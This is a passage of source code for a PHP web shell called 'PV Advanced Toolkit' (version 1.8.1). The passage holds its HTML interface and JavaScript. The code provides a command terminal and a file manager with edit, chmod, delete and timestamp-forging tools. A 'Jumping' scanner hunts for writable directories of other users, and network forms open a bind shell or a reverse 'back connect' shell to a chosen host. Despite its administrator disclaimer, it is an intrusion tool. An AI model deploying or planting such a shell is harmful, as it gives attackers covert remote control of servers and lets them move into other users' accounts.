<input type="hidden" name="action" value="logout">
<button type="submit">Logout</button>
</form>
</header>
<div class="tabs">
<span class="tab-link active" data-tab="terminal">Terminal</span>
<span class="tab-link" data-tab="filemanager">File Manager</span>
<span class="tab-link" data-tab="uncompressor">Uncompressor</span>
<span class="tab-link" data-tab="jumping">Jumping</span>
<span class="tab-link" data-tab="serverinfo">Server Info</span>
<span class="tab-link" data-tab="network">Network Tools</span>
<span class="tab-link" data-tab="phpinfo" id="phpinfo-tab-button">PHP Info</span>
<span class="tab-link" data-tab="about">About</span>
</div>
<div id="terminal" class="tab-content active">
<div id="terminal-output"></div>
<div id="command-input-wrapper">
<input type="text" id="command-input" placeholder="Enter command..." autocomplete="off">
<button id="terminal-abort-btn" class="inputzbut hidden" style="background-color: #ff4444;" title="Terminate running command (SIGKILL)">Abort</button>
</div>
</div>
<div id="filemanager" class="tab-content">
<div id="file-manager-path-container">
<div id="drive-list"></div>
<div id="file-manager-path"></div>
<div id="file-manager-path-bar-container" style="margin-top: 10px; display: flex;">
<input type="text" id="file-manager-path-input" class="inputz" style="flex-grow: 1; margin-right: 5px;" placeholder="Enter path and click GO">
<button id="file-manager-go-btn" class="inputzbut">GO</button>
</div>
</div>
<div class="button-bar">
<input type="file" id="file-upload-input" class="hidden" multiple>
<button id="file-manager-home-btn" class="inputzbut">Home</button>
<button id="file-upload-btn" class="inputzbut">Upload File(s)</button>
<button id="create-file-btn" class="inputzbut">New File</button>
<button id="create-folder-btn" class="inputzbut">New Folder</button>
<div id="bulk-actions-container" class="hidden">
<select id="bulk-action-select" class="inputz">
<option value="">-- Bulk Actions --</option>
<option value="delete">Delete</option>
<option value="copy">Copy</option>
<option value="move">Move</option>
<option value="zip">Zip</option>
<?php if (class_exists('PharData')): ?>
<option value="tar.gz">Compress (tar.gz)</option>
<option value="tar.bz2">Compress (tar.bz2)</option>
<?php
            endif; ?>
</select>
<div id="bulk-action-inputs">
<input type="text" id="bulk-destination-path" class="inputz hidden" placeholder="Destination Path">
<input type="text" id="bulk-archive-name" class="inputz hidden" placeholder="archive.zip">
</div>
<button id="bulk-action-go-btn" class="inputzbut">Go</button>
</div>
</div>
<table class="file-table">
<thead><tr><th class="col-actions-th"><input type="checkbox" id="select-all-checkbox"></th><th>Name</th><th>Type</th><th>Size</th><th>Owner/Group</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead>
<tbody id="file-listing"><tr><td colspan="8" style="text-align:center;">Loading...</td></tr></tbody>
</table>
</div>
<div id="uncompressor" class="tab-content">
<h2>Uncompressor Tool</h2>
<p>Extract compressed files (.zip, .rar, .tar, .7z) on your server.</p>
<div class="uncompressor-sub-tabs">
<button class="uncompressor-sub-tab active" data-subtab="uncompressor-upload">Upload File</button>
<button class="uncompressor-sub-tab" data-subtab="uncompressor-local">From Server Path</button>
</div>
<form id="uncompressor-form" enctype="multipart/form-data">
<div id="uncompressor-upload" class="uncompressor-sub-content active">
<div class="input-group">
<label for="uncompressor-file-input">Compressed File:</label>
<input type="file" name="compressed_file" id="uncompressor-file-input" class="inputz" style="padding: 4px;">
<small>Max file size: <?php echo ini_get('upload_max_filesize'); ?></small>
</div>
</div>
<div id="uncompressor-local" class="uncompressor-sub-content">
<div class="input-group">
<label for="uncompressor-local-path">Local File Path:</label>
<input type="text" name="local_file" id="uncompressor-local-path" class="inputz" placeholder="e.g., 'archive.zip' or 'backups/file.tar.gz'">
<small>Path is relative to this script. Must be within the script's directory.</small>
</div>
</div>
<div class="input-group">
<label for="uncompressor-destination">Destination Directory (optional):</label>
<input type="text" name="destination" id="uncompressor-destination" class="inputz" placeholder="e.g., 'extracted_files' (defaults to current dir)">
<small>If blank, files extract to the same directory as this script. Must be within the script's directory.</small>
</div>
<button type="submit" class="inputzbut">Uncompress File</button>
</form>
<div id="uncompressor-results"></div>
<h3 style="margin-top: 25px; border-bottom: 1px solid #055; padding-bottom: 5px;">Server Requirements Check</h3>
<table class="info-table" style="margin-top: 10px;">
<tr><td>Zip Support (ZipArchive)</td><td><?php echo class_exists('ZipArchive') ? '<span style="color:lime;">Enabled</span>' : '<span style="color:red;">Disabled</span>'; ?></td></tr>
<tr><td>Tar Support (PharData)</td><td><?php echo class_exists('PharData') ? '<span style="color:lime;">Enabled</span>' : '<span style="color:red;">Disabled</span>'; ?></td></tr>
<tr><td>Rar Command-line Tool</td><td><?php echo command_exists('unrar') ? '<span style="color:lime;">Available</span>' : '<span style="color:orange;">Not Found</span>'; ?></td></tr>
<tr><td>7z Command-line Tool</td><td><?php echo command_exists('7z') ? '<span style="color:lime;">Available</span>' : '<span style="color:orange;">Not Found</span>'; ?></td></tr>
</table>
</div>
<div id="jumping" class="tab-content">
<h2>Jumping - Permissions Scanner</h2>
<p>This tool scans for misconfigured `public_html` directories of other users on the server. It checks for readable and writable paths. This feature is intended for Linux servers only.</p>
<div class="button-bar">
<button id="start-jumping-scan-btn" class="inputzbut">Start Scan</button>
</div>
<div id="jumping-results"></div>
</div>
<div id="serverinfo" class="tab-content">
<h2>Server Information</h2>
<table class="info-table"><?php
            $server_details = getServerInfoDetails();
            foreach ($server_details as $k => $v)
            {
                echo "<tr><td>" . htmlspecialchars($k) . "</td><td>";
                if ($k === 'Danger')
                {
                    echo $v;
                }
                elseif (in_array($k, array(
                    'Network Interfaces (attempt)',
                    'Disabled Functions',
                    'Open Basedir',
                    'Include Path',
                    'Session Save Path',
                    'Downloaders',
                    'Useful'
                )))
                {
                    echo "<pre>" . htmlspecialchars($v) . "</pre>";
                }
                else
                {
                    $value_display = (is_string($v) && strpos($v, '<') !== false) ? $v : htmlspecialchars($v);
                    echo $value_display;
                }
                echo "</td></tr>";
            }
?></table>
</div>
<div id="network" class="tab-content network-forms">
<fieldset>
<legend>PHP Foreground Port Bind</legend>
<form id="php-bind-form"><table>
<tr><td>Port:</td><td><input class="inputz" type="text" name="port" value="1337" required></td></tr>
<tr><td>Password:</td><td><input class="inputz" type="text" name="bind_pass" value="secret" required></td></tr>
<tr><td colspan="2" align="center"><button class="inputzbut" type="submit">Bind Port (PHP)</button></td></tr>
<tr><td colspan="2"><span class="net-warning">[Warn] Runs in foreground. Page will hang while active.</span></td></tr>
</table></form>
</fieldset>
<fieldset>
<legend>PHP Foreground Back Connect</legend>
<form id="php-back-connect-form"><table>
<tr><td>Target IP/Host:</td><td><input class="inputz" type="text" name="ip" value="<?=htmlspecialchars(isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1') ?>" required></td></tr>
<tr><td>Port:</td><td><input class="inputz" type="text" name="backport" value="4444" required></td></tr>
<tr><td colspan="2" align="center"><button class="inputzbut" type="submit">Connect Back (PHP)</button></td></tr>
<tr><td colspan="2"><span class="net-warning">[Warn] Runs in foreground. Page will hang while active.</span></td></tr>
</table></form>
</fieldset>
<fieldset style="width: 98%; float: none; margin: 15px auto;">
<legend>Network Utilities</legend>
<form id="ping-form" style="margin-bottom:15px;"><table>
<tr><td>Host/IP (Ping):</td><td><input class="inputz" type="text" name="ping_host" value="google.com" required></td></tr>
<tr><td colspan="2" align="center"><button class="inputzbut" type="submit">Ping</button></td></tr>
</table></form>
<form id="dns-form" style="margin-bottom:15px;"><table>
<tr><td>Host (DNS Lookup):</td><td><input class="inputz" type="text" name="dns_host" value="google.com" required></td></tr>
<tr><td colspan="2" align="center"><button class="inputzbut" type="submit">Lookup DNS</button></td></tr>
</table></form>
<form id="port-scan-form"><table>
<tr><td>Host/IP (Port Scan):</td><td><input class="inputz" type="text" name="scan_host" value="localhost" required></td></tr>
<tr><td>Ports (e.g. 80,443,22-25):</td><td><input class="inputz" type="text" name="scan_ports" value="80,443,21,22,25,3306" required></td></tr>
<tr><td colspan="2" align="center"><button class="inputzbut" type="submit">Scan Ports</button></td></tr>
</table></form>
</fieldset>
<div id="network-results-area"></div>
</div>
<div id="phpinfo" class="tab-content">
<iframe id="phpinfo-iframe" style="width:100%; height:600px; border:1px solid #055;"></iframe>
</div>
<div id="about" class="tab-content">
<div id="about-content">
<div style="display: flex; align-items: flex-start; margin-bottom: 15px;">
<img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjZwdGpicmw2bmZwcHpmcDg1ZGZuZ2t5cWh1cGI0Y2lzdDB6aGh0ZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/xxlo1yG0pvhJqNhhtj/giphy.gif" alt="Toolkit GIF" style="width: 200px; height: 200px; margin-right: 20px; border-radius: 5px; flex-shrink: 0;">
<div style="flex-grow: 1;">
<h2>About PV Advanced Toolkit</h2>
<p><strong>Version:</strong> 1.8.1</p>
<p>This toolkit is a comprehensive PHP-based web shell and server management interface, designed for server administrators and security professionals for system inspection, management, and basic network operations.</p>
</div>
</div>
<h3>Core Features:</h3>
<ul>
<li><strong>Secure Authentication:</strong> Password-protected login to prevent unauthorized access.</li>
<li><strong>IP & User-Agent Whitelisting:</strong> Optional layers of security to restrict access based on IP address or browser/tool user-agent.</li>
<li><strong>Interactive Terminal Emulator:</strong>
<ul>
<li>Execute shell commands directly on the server.</li>
<li><strong>NEW: Abort Command:</strong> Terminate long-running commands with an 'Abort' button.</li>
<li>Support for long-running commands via real-time output streaming, preventing AJAX timeouts.</li>
<li>Command history navigation with Up/Down arrow keys.</li>
<li>Maintains current working directory per session.</li>
</ul>
</li>
<li><strong>Advanced File Manager:</strong>
<ul>
<li><strong>NEW: Bulk Actions:</strong> Select multiple files/folders to Delete, Copy, Move, or Compress (Zip, Tar.gz, Tar.bz2) them at once.</li>
<li><strong>NEW: Large File Uploads & Progress Bar:</strong> Upload files of any size (1GB+) with real-time progress bars for each file, using a chunked upload method.</li>
<li><strong>Navigation:</strong> Navigate directories with clickable breadcrumbs, an editable path bar, and drive detection (Windows).</li>
<li>Browse server directories and view file/folder details (name, type, size, permissions, last modified).</li>
<li><strong>File Operations:</strong> View/Edit text files, Download files, Rename, Chmod, Touch, and Delete files/folders (recursively).</li>
<li><strong>Creation Tools:</strong> Create new empty files and new folders.</li>
<li>Visual icons for different file types.</li>
</ul>
</li>
<li><strong>Server Information Panel:</strong>
<ul>
<li>Displays a wide range of server details including software, PHP version, OS, CPU info, user info, PHP configurations (safe mode, disabled functions, memory limits, etc.), enabled extensions, disk space, network details, and more.</li>
</ul>
</li>
<li><strong>Network Tools:</strong>
<ul>
<li><strong>PHP Foreground Shells:</strong> Port Bind and Back Connect interactive shells.</li>
<li><strong>Utilities:</strong> Ping, DNS Lookup, and a Port Scanner.</li>
</ul>
</li>
<li><strong>PHP Info Display:</strong> Shows the full output of `phpinfo()` in an isolated iframe.</li>
</ul>
<p><em>Disclaimer: This tool provides powerful server access. Use responsibly and ensure it is adequately secured. The developer is not responsible for any misuse.</em></p>
</div>
</div>
</div>
<div id="file-view-modal"> <div>
<h3 id="file-modal-title">View/Edit File</h3>
<div id="file-modal-message" class="modal-message hidden"></div>
<textarea id="file-content-area"></textarea>
<div class="button-bar" style="margin-top: 10px; justify-content: flex-end;">
<button id="save-file-btn" class="inputzbut">Save Changes</button>
<button id="close-modal-btn" class="inputzbut" style="background:#555;">Close</button>
</div>
</div>
</div>
<div id="upload-modal">
<div>
<h3 id="upload-modal-title">File Upload Progress</h3>
<div id="upload-progress-container"></div>
<div class="button-bar" style="margin-top: 10px; justify-content: flex-end;">
<button id="close-upload-modal-btn" class="inputzbut" style="background:#555;">Close</button>
</div>
</div>
</div>
<script>
document.addEventListener('DOMContentLoaded',function(){
const tabs=document.querySelectorAll('.tab-link');
const contents=document.querySelectorAll('.tab-content');
const terminalOutput=document.getElementById('terminal-output');
const commandInput=document.getElementById('command-input');
const terminalAbortBtn=document.getElementById('terminal-abort-btn');
const fileListingBody=document.getElementById('file-listing');
const driveListContainer=document.getElementById('drive-list');
const breadcrumbContainer=document.getElementById('file-manager-path');
const pathInput=document.getElementById('file-manager-path-input');
const goBtn=document.getElementById('file-manager-go-btn');
const phpInfoIframe=document.getElementById('phpinfo-iframe');
const fileViewModal=document.getElementById('file-view-modal');
const fileModalTitle=document.getElementById('file-modal-title');
const fileContentArea=document.getElementById('file-content-area');
const saveFileBtn=document.getElementById('save-file-btn');
const closeModalBtn=document.getElementById('close-modal-btn');
const fileModalMessage=document.getElementById('file-modal-message');
const fileUploadInput=document.getElementById('file-upload-input');
const fileUploadBtn=document.getElementById('file-upload-btn');
const uploadModal=document.getElementById('upload-modal');
const uploadProgressContainer=document.getElementById('upload-progress-container');
const closeUploadModalBtn=document.getElementById('close-upload-modal-btn');
const startJumpingScanBtn=document.getElementById('start-jumping-scan-btn');
const jumpingResultsDiv=document.getElementById('jumping-results');
const uncompressorForm=document.getElementById('uncompressor-form');
const uncompressorResults=document.getElementById('uncompressor-results');
const uncompressorSubTabs=document.querySelectorAll('.uncompressor-sub-tab');
const uncompressorSubContents=document.querySelectorAll('.uncompressor-sub-content');
const uncompressorFileInput=document.getElementById('uncompressor-file-input');
const uncompressorLocalPathInput=document.getElementById('uncompressor-local-path');
const bulkActionsContainer=document.getElementById('bulk-actions-container');
const selectAllCheckbox=document.getElementById('select-all-checkbox');
const bulkActionSelect=document.getElementById('bulk-action-select');
const bulkActionInputs=document.getElementById('bulk-action-inputs');
const bulkDestinationPath=document.getElementById('bulk-destination-path');
const bulkArchiveName=document.getElementById('bulk-archive-name');
const bulkActionGoBtn=document.getElementById('bulk-action-go-btn');
const scriptHomeDirectory='<?php echo addslashes(htmlspecialchars(getcwd())); ?>';
const initialFileManagerPath='<?php echo addslashes(htmlspecialchars($fileManagerInitialPath)); ?>';
const terminalCwdFromServer='<?php echo addslashes(htmlspecialchars(isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd())); ?>';
let currentFileManagerPath=initialFileManagerPath;
let currentTerminalCwd=terminalCwdFromServer;
let currentEditingFile='';
let commandHistory=[];
let historyIndex=-1;
let isCommandRunning=false;
function htmlEntities(str){
return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
function formatBytes(bytes,decimals=2){
if(bytes===0)return '0 Bytes';
const k=1024;
const dm=decimals<0?0:decimals;
const sizes=['Bytes','KB','MB','GB','TB','PB'];
const i=Math.floor(Math.log(bytes)/Math.log(k));
return parseFloat((bytes/Math.pow(k,i)).toFixed(dm))+' '+sizes[i];
}
function showModalMessage(message,type='success'){
fileModalMessage.textContent=message;
fileModalMessage.className=`modal-message ${type}`;
fileModalMessage.classList.remove('hidden');
setTimeout(()=>hideModalMessage(),3500);
}
function hideModalMessage(){
fileModalMessage.classList.add('hidden');
}
function showCustomAlert(message,type='info',duration=3000){
const alertBox=document.createElement('div');
Object.assign(alertBox.style,{position:'fixed',left:'50%',top:'20px',transform:'translateX(-50%)',padding:'10px 20px',borderRadius:'5px',zIndex:'2000',boxShadow:'0 0 10px rgba(0,0,0,0.5)',fontFamily:"'Orbitron', sans-serif",transition:'opacity 0.5s ease'});
if(type==='success'){alertBox.style.backgroundColor='#00A65A';alertBox.style.color='#fff';}
else if(type==='error'){alertBox.style.backgroundColor='#E74C3C';alertBox.style.color='#fff';}
else{alertBox.style.backgroundColor='#0ff';alertBox.style.color='#000';}
alertBox.textContent=message;
document.body.appendChild(alertBox);
setTimeout(()=>{
alertBox.style.opacity='0';
setTimeout(()=>alertBox.remove(),500);
},duration);
}
function setActiveTab(tabId){
tabs.forEach(t=>t.classList.remove('active'));
contents.forEach(c=>c.classList.remove('active'));
const activeTabLink=document.querySelector(`.tab-link[data-tab="${tabId}"]`);
const activeTabContent=document.getElementById(tabId);
if(activeTabLink&&activeTabContent){
activeTabLink.classList.add('active');
activeTabContent.classList.add('active');
localStorage.setItem('activeShellTab',tabId);
if(tabId==='phpinfo'&&(!phpInfoIframe.src||phpInfoIframe.src==="about:blank")){
phpInfoIframe.src='?action_get=phpinfo_content';
}
if(tabId==='filemanager'&&fileListingBody.innerHTML.includes('Loading...')){
fetchFiles(currentFileManagerPath);
}
}else{
setActiveTab('terminal');
}
}
tabs.forEach(tab=>tab.addEventListener('click',function(){setActiveTab(this.dataset.tab);}));
const lastTabId=localStorage.getItem('activeShellTab');
setActiveTab(lastTabId||'terminal');
async function sendAjaxRequest(action,data={},isUpload=false){
const formData=isUpload?data:new FormData();
if(!isUpload){
formData.append('ajax_action',action);
for(const key in data){
formData.append(key,data[key]);
}
}
try{
const response=await fetch('<?php echo $_SERVER['PHP_SELF']; ?>',{method:'POST',body:formData});
if(!response.ok){
const errorText=await response.text();
if(response.headers.get("content-type")?.indexOf("text/html")!==-1){
return{status:'html_error',content:errorText};
}
throw new Error(errorText||`HTTP error ${response.status}`);
}
const responseText=await response.text();
if(!responseText){
return{status:'error',message:'AJAX request returned an empty response from server.'};
}
const responseData=JSON.parse(responseText);
if(responseData.cwd)currentTerminalCwd=responseData.cwd;
if(responseData.path)currentFileManagerPath=responseData.path;
return responseData;
}catch(error){
console.error('AJAX Error:',error);
return{status:'error',message:`AJAX request failed: ${error.message}`};
}
}
function setCommandRunning(running){
isCommandRunning=running;
commandInput.disabled=running;
if(running){
terminalAbortBtn.classList.remove('hidden');
}else{
terminalAbortBtn.classList.add('hidden');
appendToTerminalOutput("",'prompt');
}
}
function appendToTerminalOutput(text,type='output'){
const line=document.createElement('div');
if(type==='input-command'){
line.innerHTML=`<span class="prompt">${htmlEntities(currentTerminalCwd)}&gt; </span><span class="input-command">${htmlEntities(text)}</span>`;
}else if(type==='error'){
line.className='error';line.textContent=text;
}else if(type==='info'){
line.className='info';line.textContent=text;
}else if(type==='html_error'){
line.className='html-error-container';
const iframe=document.createElement('iframe');
iframe.sandbox='allow-same-origin';iframe.srcdoc=text;
line.appendChild(iframe);
}else if(type==='prompt'){
const promptHtml=`<span class="prompt">${htmlEntities(currentTerminalCwd)}&gt; </span>`;
if(terminalOutput.lastChild&&terminalOutput.lastChild.classList.contains('prompt-container')){
terminalOutput.lastChild.innerHTML=promptHtml;
}else{
line.className='prompt-container';line.innerHTML=promptHtml;
terminalOutput.appendChild(line);
}
terminalOutput.scrollTop=terminalOutput.scrollHeight;
return;
}else{
line.innerHTML=text;
}
terminalOutput.appendChild(line);
terminalOutput.scrollTop=terminalOutput.scrollHeight;
}
async function handleCommand(commandText){
appendToTerminalOutput(commandText,'input-command');
setCommandRunning(true);
if(commandText.toLowerCase()==='clear'){
terminalOutput.innerHTML='';
appendToTerminalOutput('Terminal cleared.','info');
setCommandRunning(false);
}else if(commandText.trim().toLowerCase().startsWith('cd')){
const result=await sendAjaxRequest('execute_command',{command:commandText});
if(result.status==='success'&&result.output){
appendToTerminalOutput(result.output,'info');
}else if(result.status!=='success'){
appendToTerminalOutput(result.message||'Error executing cd.','error');
}
setCommandRunning(false);
}else{
await streamCommand(commandText);
setCommandRunning(false);
}
}
async function streamCommand(command){
const outputContainer=document.createElement('div');
terminalOutput.appendChild(outputContainer);
try{
const formData=new FormData();
formData.append('ajax_action','execute_command');formData.append('command',command);
const response=await fetch('<?php echo $_SERVER['PHP_SELF']; ?>',{method:'POST',body:formData});
if(!response.ok)throw new Error(`HTTP error ${response.status}`);
const reader=response.body.getReader();
const decoder=new TextDecoder();
while(true){
if(isCommandRunning===false){
reader.cancel();
break;
}
const{done,value}=await reader.read();
if(done)break;
outputContainer.textContent+=decoder.decode(value,{stream:true});
terminalOutput.scrollTop=terminalOutput.scrollHeight;
}
}catch(error){
outputContainer.className='error';
outputContainer.textContent=`[Stream Error] ${error.message}`;
terminalOutput.scrollTop=terminalOutput.scrollHeight;
}
}
commandInput.addEventListener('keypress',async(e)=>{
if(e.key==='Enter'&&!isCommandRunning){
e.preventDefault();
const commandText=commandInput.value.trim();
commandInput.value='';
if(commandText===''){appendToTerminalOutput("",'prompt');return;}
commandHistory.unshift(commandText);
if(commandHistory.length>50)commandHistory.pop();
historyIndex=-1;
await handleCommand(commandText);
}
});
terminalAbortBtn.addEventListener('click',async()=>{
if(!isCommandRunning)return;
terminalAbortBtn.disabled=true;
const result=await sendAjaxRequest('abort_command');
setCommandRunning(false);
appendToTerminalOutput(result.message||'Abort signal sent.','info');
terminalAbortBtn.disabled=false;
});
commandInput.addEventListener('keydown',(e)=>{
if(e.key==='ArrowUp'){
e.preventDefault();
if(commandHistory.length>0&&historyIndex<commandHistory.length-1){
historyIndex++;commandInput.value=commandHistory[historyIndex];
}
}else if(e.key==='ArrowDown'){
e.preventDefault();
if(historyIndex>0){
historyIndex--;commandInput.value=commandHistory[historyIndex];
}else{
historyIndex=-1;commandInput.value='';
}
}
});
if(document.getElementById('terminal').classList.contains('active')){
appendToTerminalOutput("",'prompt');
}
async function fetchFiles(path){
fileListingBody.innerHTML=`<tr><td colspan="8" style="text-align:center;">Loading files for ${htmlEntities(path)}...</td></tr>`;
const result=await sendAjaxRequest('get_file_listing',{path:path});
updateBulkActionsVisibility();
driveListContainer.innerHTML='';breadcrumbContainer.innerHTML='';
if(result.path)pathInput.value=result.path;
if(result.drives&&result.drives.length>0){
result.drives.forEach(drive=>{
const driveBtn=document.createElement('button');
driveBtn.className='inputzbut';driveBtn.textContent=drive+'\\';
driveBtn.style.cssText='padding:5px 10px; font-size:0.9em;';
driveBtn.addEventListener('click',()=>fetchFiles(drive+'\\'));
driveListContainer.appendChild(driveBtn);
});
}
if(result.breadcrumbs&&result.breadcrumbs.length>0){
const separator=result.ds==='\\'?'\\':'/';
result.breadcrumbs.forEach((crumb,index)=>{
const crumbLink=document.createElement('a');
crumbLink.href='#';crumbLink.textContent=htmlEntities(crumb.name);
crumbLink.addEventListener('click',(e)=>{e.preventDefault();fetchFiles(crumb.path);});
breadcrumbContainer.appendChild(crumbLink);
if(index<result.breadcrumbs.length-1&&!(separator==='/'&&index===0)){
const sepSpan=document.createElement('span');
sepSpan.className='separator';sepSpan.textContent=` ${separator} `;
breadcrumbContainer.appendChild(sepSpan);
}
});
}
fileListingBody.innerHTML='';
if(result.status==='success'){
if(!result.files||result.files.length===0){
fileListingBody.innerHTML=`<tr><td colspan="8" style="text-align:center;">Directory is empty.</td></tr>`;
return;
}
result.files.forEach(file=>{
const row=fileListingBody.insertRow();
const fullItemPath=file.full_path;
const escFullPath=htmlEntities(fullItemPath);
const escFileName=htmlEntities(file.name);
let actionCheckboxCell=`<td class="col-actions-td">`;
if(file.name!=='..'){
actionCheckboxCell+=`<input type="checkbox" class="file-checkbox" data-path="${escFullPath}">`;
}
actionCheckboxCell+=`</td>`;
let nameCell=`<td><i class="${file.icon_class}" style="color:${file.icon_color};"></i> `;
if(file.type==='dir'){
nameCell+=`<a href="#" class="dir-link" data-path="${escFullPath}" style="color:${file.icon_color};">${escFileName}</a></td>`;
}else{
nameCell+=`<a href="#" class="file-link" data-path="${escFullPath}" data-name="${escFileName}" style="color:${file.icon_color};">${escFileName}</a></td>`;
}
let actionsCell='<td>';
if(file.name!=='..'){
if(file.type==='file'){
actionsCell+=`<button title="View/Edit" class="action-btn view-btn" data-path="${escFullPath}" data-name="${escFileName}"><i class="fas fa-edit"></i></button>`;
actionsCell+=`<a title="Download" class="action-btn" href="?action_get=download_file&path=${encodeURIComponent(fullItemPath)}"><i class="fas fa-download"></i></a>`;
}
actionsCell+=`<button title="Rename" class="action-btn rename-btn" data-path="${escFullPath}" data-name="${escFileName}"><i class="fas fa-pencil-alt"></i></button>`;
actionsCell+=`<button title="Chmod" class="action-btn chmod-btn" data-path="${escFullPath}" data-perms="${file.perms}" data-name="${escFileName}"><i class="fas fa-shield-halved"></i></button>`;
actionsCell+=`<button title="Touch" class="action-btn touch-btn" data-path="${escFullPath}" data-name="${escFileName}"><i class="fas fa-hand-pointer"></i></button>`;
actionsCell+=`<button title="Delete" class="action-btn delete-btn" data-path="${escFullPath}" data-name="${escFileName}" data-type="${file.type}"><i class="fas fa-trash-alt"></i></button>`;
}
actionsCell+='</td>';
row.innerHTML=`${actionCheckboxCell}${nameCell}<td>${file.type}</td><td>${file.size}</td><td>${file.owner}</td><td><span style="color:${file.perm_color}; font-weight:bold;">${file.perms}</span></td><td>${file.modified}</td>${actionsCell}`;
});
}else{
fileListingBody.innerHTML=`<tr><td colspan="8" style="text-align:center; color:red;">${htmlEntities(result.message)}</td></tr>`;
}
}
fileListingBody.addEventListener('click',e=>{
const target=e.target;
if(target.classList.contains('file-checkbox')){
updateBulkActionsVisibility();
return;
}
const actionTarget=e.target.closest('a, button');
if(!actionTarget)return;
const isDownloadLink=actionTarget.tagName==='A'&&actionTarget.title==='Download';
if(isDownloadLink){
return;
}
e.preventDefault();
const ds=actionTarget.dataset;
if(actionTarget.classList.contains('dir-link'))fetchFiles(ds.path);
else if(actionTarget.classList.contains('file-link')||actionTarget.classList.contains('view-btn'))openModalWithFile(ds.path,ds.name);
else if(actionTarget.classList.contains('rename-btn'))renameItem(ds.path,ds.name);
else if(actionTarget.classList.contains('chmod-btn'))chmodItem(ds.path,ds.perms,ds.name);
else if(actionTarget.classList.contains('touch-btn'))touchItem(ds.path,ds.name);
else if(actionTarget.classList.contains('delete-btn'))deleteItem(ds.path,ds.name,ds.type);
});
function navigateToInputPath(){
const newPath=pathInput.value.trim();
if(newPath)fetchFiles(newPath);
}
goBtn.addEventListener('click',navigateToInputPath);
pathInput.addEventListener('keypress',(e)=>{if(e.key==='Enter')navigateToInputPath();});
document.getElementById('file-manager-home-btn').addEventListener('click',()=>fetchFiles(scriptHomeDirectory));
window.openModalWithFile=(filePath,fileName)=>{
currentEditingFile=filePath;
const isSystemFile=filePath==='/etc/passwd'||filePath==='/etc/shadow';
saveFileBtn.style.display=isSystemFile?'none':'inline-block';
fileContentArea.readOnly=isSystemFile;
fileModalTitle.textContent=`${isSystemFile?'View':'View/Edit'}: ${htmlEntities(fileName)}`;
fileContentArea.value='Loading content...';
hideModalMessage();fileViewModal.classList.add('visible');
sendAjaxRequest('get_file_content',{path:filePath}).then(r=>{
fileContentArea.value=r.status==='success'?r.content:`[Error] ${r.message}`;
});
}
closeModalBtn.addEventListener('click',()=>fileViewModal.classList.remove('visible'));
saveFileBtn.addEventListener('click',async()=>{
if(!currentEditingFile)return;
const result=await sendAjaxRequest('save_file_content',{path:currentEditingFile,content:fileContentArea.value});
showModalMessage(result.message||'Response from server.',result.status);
});
window.renameItem=async(path,name)=>{
const newName=prompt(`Enter new name for "${name}":`,name);
if(newName&&newName.trim()!==""&&newName!==name){
const result=await sendAjaxRequest('rename_item',{path,new_name:newName.trim()});
showCustomAlert(result.message,result.status);
if(result.status==='success')fetchFiles(currentFileManagerPath);
}
}
window.chmodItem=async(path,perms,name)=>{
const newPerms=prompt(`Enter new permissions for "${name}" (e.g., 0755):`,perms.slice(-3));
if(newPerms?.match(/^[0-7]{3,4}$/)){
const result=await sendAjaxRequest('chmod_item',{path,perms:newPerms.trim()});
showCustomAlert(result.message,result.status);
if(result.status==='success')fetchFiles(currentFileManagerPath);
}else if(newPerms)showCustomAlert("Invalid permission format.",'error');
}
window.touchItem=async(path,name)=>{
const d=new Date(),ts=`${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}-${String(d.getDate()).padStart(2,'0')} ${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}`;
const newTimeStr=prompt(`Enter new timestamp for "${name}":`,ts);
if(newTimeStr){
const result=await sendAjaxRequest('touch_item',{path,datetime_str:newTimeStr});
showCustomAlert(result.message,result.status);
if(result.status==='success')fetchFiles(currentFileManagerPath);
}
}
window.deleteItem=async(path,name,type)=>{
if(confirm(`Delete ${type} "${name}"? This cannot be undone.`)){
const result=await sendAjaxRequest('delete_item',{path});
showCustomAlert(result.message,result.status);
if(result.status==='success')fetchFiles(currentFileManagerPath);
}
};
document.getElementById('create-file-btn').addEventListener('click',async()=>{
const filename=prompt("Enter new file name:","newfile.txt");
if(filename?.trim()){
const result=await sendAjaxRequest('create_new_file',{path:currentFileManagerPath,name:filename.trim()});
showCustomAlert(result.message,result.status);
if(result.status==='success')fetchFiles(currentFileManagerPath);
}
});
document.getElementById('create-folder-btn').addEventListener('click',async()=>{
const foldername=prompt("Enter new folder name:","new_folder");
if(foldername?.trim()){
const result=await sendAjaxRequest('create_new_folder',{path:currentFileManagerPath,name:foldername.trim()});
showCustomAlert(result.message,result.status);
if(result.status==='success')fetchFiles(currentFileManagerPath);
}
});
fileUploadBtn.addEventListener('click',()=>fileUploadInput.click());
if(closeUploadModalBtn){
closeUploadModalBtn.addEventListener('click',()=>{
uploadModal.classList.remove('visible');
fetchFiles(currentFileManagerPath);
});
}
fileUploadInput.addEventListener('change',async function(){
if(this.files.length===0)return;
if(uploadProgressContainer)uploadProgressContainer.innerHTML='';
if(uploadModal)uploadModal.classList.add('visible');
const fileList=Array.from(this.files);
this.value='';
const uploadPromises=fileList.map(file=>{
const progressItem=createProgressBar(file);
return uploadFileInChunks(file,progressItem);
});
await Promise.all(uploadPromises);
showCustomAlert('All uploads finished!','success');
});
function createProgressBar(file){
const uploadId='upload-'+Date.now()+'-'+Math.random().toString(36).substr(2,9);
const item=document.createElement('div');
item.className='upload-progress-item';
item.dataset.uploadId=uploadId;
item.dataset.fileName=file.name;
item.innerHTML=`
 <div class="filename">${htmlEntities(file.name)} (${formatBytes(file.size)})</div>
 <div class="upload-progress-bar-bg">
 <div class="upload-progress-bar"></div>
 </div>
 <div class="upload-progress-info">
 <span class="status">Pending...</span>
 <span class="percentage">0%</span>
 </div>
 `;
if(uploadProgressContainer)uploadProgressContainer.appendChild(item);
return item;
}
async function uploadFileInChunks(file,progressItem){
return new Promise((resolve,reject)=>{
const chunkSize=2*1024*1024;
const totalChunks=Math.ceil(file.size/chunkSize);
const uploadId=progressItem.dataset.uploadId;
let chunkIndex=0;
